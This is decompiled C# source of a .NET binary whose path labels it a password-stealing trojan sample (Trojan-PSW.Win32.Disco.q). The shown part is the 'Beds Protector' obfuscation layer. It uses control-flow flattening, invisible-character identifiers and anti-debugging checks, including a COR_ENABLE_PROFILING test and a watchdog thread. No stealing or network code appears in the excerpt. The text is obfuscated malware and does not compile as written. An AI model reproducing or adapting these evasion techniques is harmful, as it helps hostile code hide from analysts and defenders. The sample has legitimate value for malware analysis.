// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: вє∂ѕ ρяσтє¢тσя - 301434563740455627179307231, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C1C6591-CD65-49C9-8D4C-8309847AE7DD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.Win32.Disco.q-ea920641a79ebb3293aae57e5f542aaea2a883492d14209e20ff794b77ffd00f.exe

using idk.Properties;
using System;
using System.Collections;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

internal class \u003CModule\u003E
{
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static FileStream Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string[] Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string[] Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static int Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static int Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static Exception Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ProcessStartInfo Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static Stream Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static FileStream Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static int Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static Random Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static int Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static object[] Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ProcessStartInfo Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static IntPtr Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ManagementObjectSearcher Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ManagementObjectCollection Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ManagementObjectCollection.ManagementObjectEnumerator Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ManagementBaseObject Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ArrayList Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ManagementClass Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ManagementObject Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static int Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ResourceManager Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ResourceManager Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static CultureInfo Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static Settings Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;

  static \u003CModule\u003E()
  {
    \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogOBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogOBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ();
    \u003CModule\u003E.\u200F⁯⁭‬‎‍​‬‫‪‎⁯‏‏⁯⁮‍‎⁬‏⁬‭⁯‍⁮‫⁯‭‏‏‪⁬‬⁮⁬‭‭‏⁮‍‮();
  }

  private static void \u200F⁯⁭‬‎‍​‬‫‪‎⁯‏‏⁯⁮‍‎⁬‏⁬‭⁯‍⁮‫⁯‭‏‏‪⁬‬⁮⁬‭‭‏⁮‍‮()
  {
    int num = 17392 - 72652 + 55260;
    do
    {
      string str;
      if (num == 79270 - 31675 - 47594)
      {
        str = "COR";
        num = 58282 - 44986 - 13294;
      }
      MethodInfo methodInfo;
      if (num == 72466 - 30021 - 42441)
      {
        if (\u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogdThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogdᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((object) "1", \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogCThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogCᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((object) methodInfo, (object) null, new object[1]
        {
          (object) \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogcThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogcᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(str, "_ENABLE_PROFILING")
        })))
          num = 31917 - 63318 + 31406;
        else
          goto label_14;
      }
      if (num == 19825 - 110259 + 90436)
      {
        // ISSUE: type reference
        // ISSUE: type reference
        methodInfo = (MethodInfo) \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(\u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(__typeref (Environment)), "GetEnvironmentVariable", new Type[1]
        {
          (Type) \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogbThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogbᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(__typeref (string))
        });
        num = 4306 - 4522 + 219;
      }
      if (num == 69616 - 11200 - 58413)
      {
        if ((object) methodInfo != null)
          num = 39684 - 82916 + 43236;
        else
          goto label_14;
      }
      if (num == 14088 + 80154 - 94237)
      {
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogDThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogDᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((string) null);
        num = 7690 + 67122 - 74806;
      }
      if (num != 68053 - 113800 + 45753)
        goto label_15;
label_14:
      object obj = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogeThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogeᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((object) new ParameterizedThreadStart(\u003CModule\u003E.\u200B‏​​‎‮‎​‭⁭​‮​‫‌‭‌‬‫‌‫​⁬⁬‪‏‪‎⁫‬⁪‎⁭⁯‫‪‭‏‌‌‮));
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogEThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogEᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(obj, true);
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogfThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogfᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(obj, (object) null);
      num = 31309 - 76821 + 45519;
label_15:
      if (num == 38200 - 111133 + 72933)
        num = 43805 - 5984 - 37820;
    }
    while (num != 63386 - 50953 - 12426);
  }

  private static void \u200B‏​​‎‮‎​‭⁭​‮​‫‌‭‌‬‫‌‫​⁬⁬‪‏‪‎⁫‬⁪‎⁭⁯‫‪‭‏‌‌‮([In] object obj0)
  {
    int num = 94967 - 34173 - 60794;
label_1:
    Thread thread;
    if (num == 88243 - 90570 + 2330)
    {
      thread = (Thread) \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogFThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogFᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((object) new ParameterizedThreadStart(\u003CModule\u003E.\u200B‏​​‎‮‎​‭⁭​‮​‫‌‭‌‬‫‌‫​⁬⁬‪‏‪‎⁫‬⁪‎⁭⁯‫‪‭‏‌‌‮));
      num = 65029 + 7374 - 72399;
    }
    if (num != 96847 - 49828 - 47010)
      goto label_5;
label_4:
    \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogjThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogjᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((string) null);
    num = 4357 - 96721 + 92374;
label_5:
    if (num != 21745 + 19057 - 40795)
      goto label_8;
label_6:
    if (!\u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogiThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogiᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ())
      num = 67635 - 85423 + 17796;
    else
      goto label_4;
label_8:
    if (num == 85652 - 120217 + 34569)
    {
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoggThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoggᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((object) thread, true);
      num = 44916 - 129895 + 84984;
    }
    if (num != 68043 + 27285 - 95318)
      goto label_13;
label_11:
    if (!\u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogJThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogJᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((object) thread))
      num = 20592 - 69790 + 49209;
    else
      goto label_19;
label_13:
    if (num == 30810 - 113580 + 82775)
    {
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoghThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoghᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((object) thread, \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogGThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogGᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ());
      num = 33443 - 57319 + 23882;
    }
    if (num == 72475 - 96393 + 23926)
    {
      if (\u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogIThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogIᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ())
        num = 73354 - 49118 - 24227;
      else
        goto label_11;
    }
    if (num != 98509 - 1655 - 96842)
      goto label_20;
label_19:
    \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogKThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogKᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(1000);
    num = 80559 - 72763 - 7783;
label_20:
    if (num == 97025 - 148176 + 51157)
    {
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogHThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogHᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(500);
      num = 94629 - 36660 - 57962;
    }
    if (num == 26224 - 12711 - 13502)
    {
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogkThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogkᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((string) null);
      num = 17346 - 39297 + 21963;
    }
    if (num == 77081 - 140367 + 63288)
    {
      if (thread == null)
        num = 97800 - 190737 + 92940;
      else
        goto label_6;
    }
    if (num == 9598 - 36062 + 26465)
    {
      thread = obj0 as Thread;
      num = 16912 - 20095 + 3185;
    }
    if (num == 93870 - 39816 - 54054)
      num = 21921 + 10342 - 32262;
    if (num != 88141 - 87065 - 1063)
      goto label_1;
    else
      goto label_6;
  }

  static object Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeTypeHandle obj0)
  {
    int num = 87534 - 6987 - 80547;
    do
    {
      if (num == 98052 - 22181 - 75871)
        num = 10739 + 24813 - 35551;
    }
    while (num != 10380 - 90968 + 80589);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogfAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogfAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.ïm\u007Eu\u005D(obj0);
  }

  static object Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogbThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogbᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeTypeHandle obj0)
  {
    int num = 1963 - 60170 + 58207;
    do
    {
      if (num == 60939 - 643 - 60296)
        num = 3902 - 43035 + 39134;
    }
    while (num != 81317 - 81907 + 591);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogfAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogfAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u00B04Î\u001Ei(obj0);
  }

  static object Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0,
    [In] string obj1,
    [In] Type[] obj2)
  {
    int num = 49046 + 47971 - 97017;
    do
    {
      if (num == 93010 + 3908 - 96918)
        num = 81239 - 47876 - 33362;
    }
    while (num != 20899 - 73586 + 52688);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogJAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogJAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u000B\u0002_F\u0020(obj0, obj1, obj2);
  }

  static string Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogcThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogcᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] string obj0,
    [In] string obj1)
  {
    int num = 82740 - 120105 + 37365;
    do
    {
      if (num == 17069 - 95462 + 78393)
        num = 90913 - 50883 - 40029;
    }
    while (num != 22596 - 38620 + 16025);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogmAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogmAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u0087k\u00D7Ø\u00D7(obj0, obj1);
  }

  static object Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogCThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogCᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0,
    [In] object obj1,
    [In] object[] obj2)
  {
    int num = 95846 - 50147 - 45699;
    do
    {
      if (num == 71966 - 147731 + 75765)
        num = 61929 - 18475 - 43453;
    }
    while (num != 79956 - 115377 + 35422);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogOAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogOAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u0089ùòg\u0082(obj0, obj1, obj2);
  }

  static bool Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogdThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogdᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0,
    [In] object obj1)
  {
    int num = 12484 + 78853 - 91337;
    do
    {
      if (num == 38633 - 12709 - 25924)
        num = 47227 - 53952 + 6726;
    }
    while (num != 5518 - 6477 + 960);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogrAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogrAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.ÕÕg\u0096Á(obj0, obj1);
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogDThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogDᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] string obj0)
  {
    int num = 22931 - 109107 + 86176;
    do
    {
      if (num == 60740 - 134320 + 73581)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogTAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogTAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.h\u008F\u0008Sð(obj0);
        num = 60561 - 51707 - 8852;
      }
      if (num == 80992 - 14514 - 66478)
        num = 51219 - 6252 - 44966;
    }
    while (num != 57597 - 140924 + 83329);
  }

  static object Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogeThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogeᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0)
  {
    int num = 40431 + 9235 - 49666;
    do
    {
      if (num == 61937 + 1942 - 63879)
        num = 87056 - 164446 + 77391;
    }
    while (num != 14105 - 24947 + 10843);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogwAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogwAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.xÒ\u0022\u0082\u0003(obj0);
  }

